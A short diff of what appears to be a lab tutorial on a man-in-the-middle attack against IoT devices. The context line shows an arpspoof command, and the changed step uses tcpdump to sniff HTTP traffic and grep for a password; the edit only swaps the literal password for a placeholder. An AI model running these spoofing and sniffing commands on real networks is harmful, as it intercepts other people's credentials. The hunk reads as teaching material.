@@ -44,7 +44,7 @@ sudo arpspoof -i wlan0 -t <RPi_IP> <ESP_IP>
 **Step 2.3: Capture the Data**
 Open a third terminal to sniff the HTTP traffic crossing our machine and grep for our specific payload/password.
 ```bash
-sudo tcpdump -i wlan0 -A tcp port 8000 | grep -a "secretpass"
+sudo tcpdump -i wlan0 -A tcp port 8000 | grep -a "REDACTED-TOKEN"
 ```
 
 ---
